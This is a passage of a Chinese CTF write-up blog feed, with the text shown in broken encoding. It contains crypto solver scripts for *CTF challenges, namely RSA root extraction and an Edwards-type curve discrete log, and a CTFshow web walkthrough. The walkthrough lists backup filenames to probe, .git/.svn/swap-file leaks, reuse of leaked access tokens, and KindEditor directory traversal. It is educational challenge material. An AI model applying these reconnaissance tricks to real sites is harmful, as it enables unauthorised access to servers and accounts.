class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AMM</span>(<span class="params">o, r, q</span>):</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">&#x27;\n----------------------------------------------------------------------------------&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    print(<span class="string">&#x27;[+] Find p:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(p))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    print(<span class="string">&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(s, t))</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    print(<span class="string">&#x27;[+] Find alp:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(alp))</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[+] Calculating DLP...&#x27;</span>)</span><br><span class="line">            j = - dicreat_log(a, d)</span><br><span class="line">            print(<span class="string">&#x27;[+] Finish DLP...&#x27;</span>)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c ^ r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    print(<span class="string">&#x27;Find one solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findAllPRoot</span>(<span class="params">p, e</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;</span>.<span class="built_in">format</span>(e, cp, p))</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">if</span> long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>).startswith(<span class="string">&#x27;*CTF&#x27;</span>):</span><br><span class="line">        print(long_to_bytes(m))</span><br><span class="line">        exit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>).startswith(<span class="string">&#x27;*ctf&#x27;</span>):</span><br><span class="line">        print(long_to_bytes(m))</span><br><span class="line">        exit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    check(<span class="built_in">int</span>(mpp))</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#39;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#39;</span><br></pre></td></tr></table></figure><blockquote><p>çœ‹è¿™ä¸ªflagå¥½åƒåˆæ˜¯æ­ªæ‰“æ­£ç€çš„ä¸€é¢˜â€¦.Pla1ä¼°è®¡æ˜¯æŸä¸ªæ–¹æ³•å§?ç­‰ä¸ªå®˜æ–¹wpå’¯<br>è¿˜å¥½paddingé•¿åº¦ä¸å¤Ÿhhhh, ä¸è¿‡è¦æ˜¯é•¿åº¦å¤Ÿè·‘é‚£ä¸ªç»„åˆARTåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥å‡ºç»“æœçš„, å°±æ˜¯è¦å¤šæ‰“ä¸¤æŠŠæ¸¸æˆè€Œå·²<br>é¡ºä¾¿ä¸€æ, è¿™ä¸ªpaddingæ˜¯æ­Œè¯å§! 500 mileså¥½å¬!</p></blockquote><h1 id="MyCurve"><a href="#MyCurve" class="headerlink" title="MyCurve"></a>MyCurve</h1><p>é™„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">&#x27;*CTF&#123;&#x27;</span> <span class="keyword">and</span> flag[-<span class="number">1</span>]==<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">flag=flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">P,Q</span>):</span></span><br><span class="line"><span class="keyword">if</span> Q==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> P</span><br><span class="line">x1,y1=P</span><br><span class="line">x2,y2=Q</span><br><span class="line"><span class="keyword">return</span> (d1*(x1+x2)+d2*(x1+y1)*(x2+y2)+(x1+x1^<span class="number">2</span>)*(x2*(y1+y2+<span class="number">1</span>)+y1*y2))/(d1+(x1+x1^<span class="number">2</span>)*(x2+y2)),(d1*(y1+y2)+d2*(x1+y1)*(x2+y2)+(y1+y1^<span class="number">2</span>)*(y2*(x1+x2+<span class="number">1</span>)+x1*x2))/(d1+(y1+y1^<span class="number">2</span>)*(x2+y2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">k,P</span>):</span></span><br><span class="line">Q=(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">while</span> k&gt;<span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> is_even(k):</span><br><span class="line">k/=<span class="number">2</span></span><br><span class="line">P=add(P,P)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">k-=<span class="number">1</span></span><br><span class="line">Q=add(P,Q)</span><br><span class="line"><span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">F=GF(<span class="number">2</span>**<span class="number">100</span>)</span><br><span class="line">R.&lt;x,y&gt;=F[]</span><br><span class="line">d1=F.fetch_int(<span class="number">1</span>)</span><br><span class="line">d2=F.fetch_int(<span class="number">1</span>)</span><br><span class="line">x,y=(<span class="number">698546134536218110797266045394L</span>, <span class="number">1234575357354908313123830206394L</span>)</span><br><span class="line">G=(F.fetch_int(x),F.fetch_int(y))</span><br><span class="line">P=mul(bytes_to_long(flag),G)</span><br><span class="line"><span class="built_in">print</span> (G[<span class="number">0</span>].integer_representation(),G[<span class="number">1</span>].integer_representation())</span><br><span class="line"><span class="built_in">print</span> (P[<span class="number">0</span>].integer_representation(),P[<span class="number">1</span>].integer_representation())</span><br><span class="line"><span class="comment">#(698546134536218110797266045394L, 1234575357354908313123830206394L)</span></span><br><span class="line"><span class="comment">#(403494114976379491717836688842L, 915160228101530700618267188624L)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¤­åœ†æ›²çº¿â€¦ ç¬¬ä¸€æ¬¡åšè¿™æ ·çš„<br>æ¯”èµ›çš„æ—¶å€™ä¹Ÿæ²¡åšå‡ºæ¥ æŸ¥äº†æŸ¥<a href="https://www.hyperelliptic.org/">https://www.hyperelliptic.org</a>  (åº”è¯¥æ˜¯ä¸€ä¸ªæ›²çº¿åº“<br>å‘ç°é‡Œé¢æœ‰ä¸€ç§æ›²çº¿å°±æ˜¯é¢˜ç›®ç»™çš„æ›²çº¿<a href="https://www.hyperelliptic.org/EFD/g12o/auto-edwards.html">å°±æ˜¯è¿™ä¸ª</a><br>å…·ä½“æ˜¯å•¥ç©æ„è¿˜æä¸æ‡‚ åªèƒ½å…ˆæŒ‰ç€åº“é‡Œé¢çš„æ•°æ®æŠŠè„šæœ¬å†™å¥½ å­¦å®ŒECCå†æ¥çœ‹çœ‹äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">F=GF(<span class="number">2</span>**<span class="number">100</span>)</span><br><span class="line">R.&lt;x,y&gt;=F[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_map</span>(<span class="params">p</span>):</span></span><br><span class="line">    x,y = F.fetch_int(p[<span class="number">0</span>]),F.fetch_int(p[<span class="number">1</span>])</span><br><span class="line">    u = <span class="number">3</span>*(x+y)/(x*y+x+y)</span><br><span class="line">    v = <span class="number">3</span>*(x/(x*y+x+y)+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> (u,v)</span><br><span class="line">G = (<span class="number">698546134536218110797266045394</span>,<span class="number">1234575357354908313123830206394</span>)P = (<span class="number">403494114976379491717836688842</span>,<span class="number">915160228101530700618267188624</span>)</span><br><span class="line">E = EllipticCurve(GF(<span class="number">2</span>**<span class="number">100</span>),[<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>])</span><br><span class="line">base = E(_map(G))</span><br><span class="line">res = E(_map(P))</span><br><span class="line">flag = discrete_log(res,base,base.order(),operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ€»ä¹‹å°±æ˜¯åƒè€æœ¬&lt;br&gt;æ€»ä¹‹å°±æ˜¯æ›²çº¿å¥½éš¾&lt;br&gt;è¿™æ¬¡å°±å·®ä¸€é“MyCurveâ€¦æ‰¾ä¸ªå¸ˆå‚…å­¦ä¹ å­¦ä¹ å†è¡¥å……è¿™ä¸ª&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Crypto&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MyEnc&lt;/li&gt;
&lt;li&gt;GuessKey2&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/tags/WriteUp/"/>
    
    <category term="ECC" scheme="http://tearsjin.github.io/tags/ECC/"/>
    
    <category term="lfsr" scheme="http://tearsjin.github.io/tags/lfsr/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow Web1000</title>
    <link href="http://tearsjin.github.io/2020/12/12/CTFshow-Web1000/"/>
    <id>http://tearsjin.github.io/2020/12/12/CTFshow-Web1000/</id>
    <published>2020-12-12T10:31:38.000Z</published>
    <updated>2021-03-13T04:44:53.710Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>é‡é‡‘ä¹°äº†ä¸ªå·æ€ä¹ˆå¯èƒ½ä¸åšå‘¢???<br>å¥½å¥½å­¦å­¦Webäº† çœŸçš„å¾ˆé‡è¦!</p></blockquote><h1 id="ä¿¡æ¯æœé›†-Web1-20"><a href="#ä¿¡æ¯æœé›†-Web1-20" class="headerlink" title="ä¿¡æ¯æœé›† Web1~20"></a>ä¿¡æ¯æœé›† Web1~20</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><p>F12</p><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><p>æ²¡åŠæ³•F12å’Œå³é”®äº†, ç›´æ¥firefoxå¼€å‘è€…å·¥å…·</p><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>æŠ“åŒ…, flagå°±åœ¨å“åº”é‡Œ</p><blockquote><p>æ‰€ä»¥æœ‰æ—¶å€™æ²¡æ€è·¯å°±æŠ“æŠ“åŒ…, æœ‰å¯èƒ½æœ‰çº¿ç´¢æˆ–è€…æç¤ºçš„</p></blockquote><h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><p>robots.txt</p><blockquote><p>æ‰€ä»¥æ²¡æ€è·¯çš„æ—¶å€™å°±é˜¿å·´é˜¿å·´</p></blockquote><h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><p>phpsæºç æ³„éœ²</p><blockquote><p>æœ‰æ—¶å€™è¯•è¯•phpsè¯»æºç , æœ‰æƒŠå–œå“¦</p></blockquote><h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><p>ä¹Ÿæ˜¯æºç æ³„éœ², åº”è¯¥æ˜¯å¤‡ä»½å‹ç¼©åŒ…<br>å¸¸è§çš„åå­—æœ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39;www.zip&#39;,</span><br><span class="line">&#39;www.bak&#39;,</span><br><span class="line">&#39;www.rar&#39;,</span><br><span class="line">&#39;www.7z&#39;,</span><br><span class="line">&#39;www.tar&#39;,</span><br><span class="line">&#39;www.tar.gz&#39;,</span><br><span class="line">&#39;www.txt&#39;</span><br></pre></td></tr></table></figure><h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><h3 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title="gitæ³„éœ²"></a>gitæ³„éœ²</h3><p>æ¼æ´æˆå› ï¼šåœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚</p><p>ä¸€èˆ¬æ¥è¯´å°±æ˜¯.gitæ³„éœ²ä¹‹åæ¢å¤æºç ä»€ä¹ˆçš„.</p><p>æœ‰æ—¶å€™è¿˜ä¼šéœ€è¦ç”¨.git/config ä¸­å«æœ‰çš„access_tokenä¿¡æ¯, ä»è€Œè®¿é—®è¿™ä¸ªç”¨æˆ·çš„å…¶ä»–ä»“åº“</p><p>æœ‰äº›æ—¶å€™è®¿é—®.gitä¼šè¿”å›403, è¿™ä¸ªæ—¶å€™å°±è¦è¯•æ¢çš„è®¿é—®.git/config, å¦‚æœæœ‰å†…å®¹è¿”å›, å°±è¯´æ˜å­˜åœ¨gitæ³„éœ².</p><p>å…³äºæ•æ„Ÿç›®å½•æ³„éœ², è¿˜æœ‰SVNæ³„éœ², HGæ³„éœ²ç­‰ç­‰â€¦ ç­‰ä»¥åé‡åˆ°äº†å†æ¥æ€»ç»“</p><h2 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h2><h3 id="SVN-æ³„éœ²"><a href="#SVN-æ³„éœ²" class="headerlink" title="SVN æ³„éœ²"></a>SVN æ³„éœ²</h3><p>SVN(subversion)æ˜¯ä¸€ä¸ªæºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶. åŒæ ·çš„éšè—æ–‡ä»¶.SVNé‡Œé¢ä¼šæœ‰ä¿¡æ¯. </p><p>åˆ©ç”¨seay-svnè·å–æœåŠ¡å™¨æºç ç­‰ä¿¡æ¯</p><h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><h3 id="vimå¤‡ä»½æ–‡ä»¶æ³„éœ²"><a href="#vimå¤‡ä»½æ–‡ä»¶æ³„éœ²" class="headerlink" title="vimå¤‡ä»½æ–‡ä»¶æ³„éœ²"></a>vimå¤‡ä»½æ–‡ä»¶æ³„éœ²</h3><p>å½“ç”¨æˆ·åœ¨ç”¨vimç¼–è¾‘æ–‡ä»¶ä½†æ„å¤–é€€å‡ºæ—¶, ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶, æ–‡ä»¶åæ ¼å¼ä¸º<code>.æ–‡ä»¶å.swp</code></p><p>é’ˆå¯¹swpå¤‡ä»½æ–‡ä»¶, å¯ä»¥ç”¨<code>vim -r</code>å‘½ä»¤æ¢å¤æ–‡ä»¶çš„å†…å®¹.</p><h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><p>Cookiesé‡Œé¢æœ‰å†…å®¹</p><blockquote><p>æŠ“åŒ…åˆ†æçš„æ—¶å€™ä¸€èˆ¬éƒ½ä¼šçœ‹çœ‹Cookiesçš„</p></blockquote><h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><p>åŸŸåè§£æ<br><a href="http://dbcha.com/">http://dbcha.com/</a> é‡Œé¢æŸ¥ctfshow.comçš„txtè®°å½•</p><blockquote><p>é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹åŸŸåè§£æçš„ç±»å‹</p></blockquote><h3 id="åŸŸåè§£æç±»å‹-A-CNAME-MX-NS-TXT-AAAA-SRV-æ˜¾æ€§URL-éšæ€§URL"><a href="#åŸŸåè§£æç±»å‹-A-CNAME-MX-NS-TXT-AAAA-SRV-æ˜¾æ€§URL-éšæ€§URL" class="headerlink" title="åŸŸåè§£æç±»å‹: A/CNAME/MX/NS/TXT/AAAA/SRV/æ˜¾æ€§URL/éšæ€§URL"></a>åŸŸåè§£æç±»å‹: A/CNAME/MX/NS/TXT/AAAA/SRV/æ˜¾æ€§URL/éšæ€§URL</h3><p><strong>Aè®°å½•</strong>ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€ï¼ˆä¾‹å¦‚ï¼š10.10.10.10ï¼‰ï¼Œéœ€è¦å¢åŠ Aè®°å½•<br><strong>CNAMEè®°å½•</strong>ï¼šå¦‚æœå°†åŸŸåæŒ‡å‘ä¸€ä¸ªåŸŸåï¼Œå®ç°ä¸è¢«æŒ‡å‘åŸŸåç›¸åŒçš„è®¿é—®æ•ˆæœï¼Œéœ€è¦å¢åŠ CNAMEè®°å½•<br><strong>MXè®°å½•</strong>ï¼šå»ºç«‹ç”µå­é‚®ç®±æœåŠ¡ï¼Œå°†æŒ‡å‘é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œéœ€è¦è®¾ç½®MXè®°å½•<br><strong>NSè®°å½•</strong>ï¼šåŸŸåè§£ææœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœè¦å°†å­åŸŸåæŒ‡å®šæŸä¸ªåŸŸåæœåŠ¡å™¨æ¥è§£æï¼Œéœ€è¦è®¾ç½®NSè®°å½•<br><strong>TXTè®°å½•</strong>ï¼šå¯ä»»æ„å¡«å†™ï¼ˆå¯ä¸ºç©ºï¼‰ï¼Œé€šå¸¸ç”¨åšSPFè®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ä½¿ç”¨<br><strong>AAAAè®°å½•</strong>ï¼šå°†ä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰æŒ‡å‘ä¸€ä¸ªIPv6åœ°å€ï¼ˆä¾‹å¦‚ï¼šff03:0:0:0:0:0:0:c1ï¼‰ï¼Œéœ€è¦æ·»åŠ AAAAè®°å½•<br><strong>SRVè®°å½•</strong>ï¼šè®°å½•äº†å“ªå°è®¡ç®—æœºæä¾›äº†å“ªä¸ªæœåŠ¡ã€‚æ ¼å¼ä¸ºï¼šæœåŠ¡çš„åå­—.åè®®çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼š_example-server._tcpï¼‰<br><strong>æ˜¾æ€§URL</strong>ï¼šå°†åŸŸåæŒ‡å‘ä¸€ä¸ªhttp(s)åè®®åœ°å€ï¼Œè®¿é—®åŸŸåæ—¶ï¼Œè‡ªåŠ¨è·³è½¬è‡³ç›®æ ‡åœ°å€ï¼ˆä¾‹å¦‚ï¼šå°†<a href="http://www.net.cnæ˜¾æ€§è½¬å‘åˆ°www.hichina.comåï¼Œè®¿é—®www.net.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä¸ºï¼šwww.hichina.comï¼‰ã€‚">www.net.cnæ˜¾æ€§è½¬å‘åˆ°www.hichina.comåï¼Œè®¿é—®www.net.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä¸ºï¼šwww.hichina.comï¼‰ã€‚</a><br><strong>éšæ€§URL</strong>ï¼šä¸æ˜¾æ€§URLç±»ä¼¼ï¼Œä½†éšæ€§è½¬å‘ä¼šéšè—çœŸå®çš„ç›®æ ‡åœ°å€ï¼ˆä¾‹å¦‚ï¼šå°†<a href="http://www.net.cnéšæ€§è½¬å‘åˆ°www.hichina.comåï¼Œè®¿é—®www.net.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä»ç„¶ä¸ºï¼šwww.net.cnï¼‰ã€‚">www.net.cnéšæ€§è½¬å‘åˆ°www.hichina.comåï¼Œè®¿é—®www.net.cnæ—¶ï¼Œåœ°å€æ æ˜¾ç¤ºçš„åœ°å€ä»ç„¶ä¸ºï¼šwww.net.cnï¼‰ã€‚</a></p><h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><blockquote><p>å¼€å§‹å˜å¾—å¥‡æ€ªäº†</p></blockquote><p>è¿›å»æ˜¯ä¸€ä¸ªè´­ç‰©ç½‘ç«™, æŠ“åŒ…æ— æœ, çœ‹äº†ä¸‹robots.txt, æœ‰æç¤º/admin/<br>è¦è¾“å…¥è´¦å·å¯†ç , è´¦å·å°±æ˜¯admin, å¯†ç æ˜¯ç½‘ç«™ä¸‹é¢çš„é‚£ä¸²æ•°å­—</p><blockquote><p>æ­£å¸¸æƒ…å†µä¸‹æ²¡æœ‰äººä¼šè¿™ä¹ˆå¹²å§!<br>æ‰€ä»¥è¿˜æ˜¯è¦å¤šå»çœ‹çœ‹ä¸€ä¸‹å¯ä»¥æœé›†ä¿¡æ¯çš„åœ°æ–¹, robotx.txtå•¥çš„</p></blockquote><h2 id="Web-13"><a href="#Web-13" class="headerlink" title="Web 13"></a>Web 13</h2><p>æ‹¿åˆ°ä¸€ä¸ªç½‘ç«™å¯ä»¥çœ‹çœ‹çœ‹çœ‹æœ‰å“ªäº›é“¾æ¥æ˜¯å¯ä»¥è·³è½¬çš„(å“ªäº›æ˜¯å¯ä»¥ç‚¹å‡»çš„)<br>ç½‘ç«™ä¸‹é¢æœ‰ä¸ªdocumentå¯ä»¥ç‚¹, è¿›å»ä»¥åé‡Œé¢æœ‰åå°çš„åœ°å€å’Œç”¨æˆ·åå¯†ç .</p><h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><blockquote><p>KindEditor PHPç¼–è¾‘å™¨æœ€æ–°ç‰ˆé»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¼šéå†æœåŠ¡å™¨æ ¹ç›®å½•</p></blockquote><p>è¿›å…¥/editor/(è¿™ä¸ªå¾—ç›®å½•æ‰«æå§â€¦ åˆ©ç”¨ä¸Šä¼ å›¾ç‰‡éå†æœåŠ¡å™¨æ ¹ç›®å½•, åœ¨ç½‘ç«™ç›®å½•ä¸‹æ‰¾åˆ°/nothinghere/fl000g.txt</p><h2 id="Web-15"><a href="#Web-15" class="headerlink" title="Web 15"></a>Web 15</h2><p>ç›®å½•ä¸‹æœ‰admin/<br>å¿˜è®°å¯†ç éœ€è¦å¡«å†™å¯†ä¿<br>è€Œç½‘ç«™ä¸‹æ–¹æœ‰qqé‚®ç®±, æœç´¢qqå¯ä»¥çŸ¥é“å¯†ä¿ç­”æ¡ˆ</p><h2 id="Web-16"><a 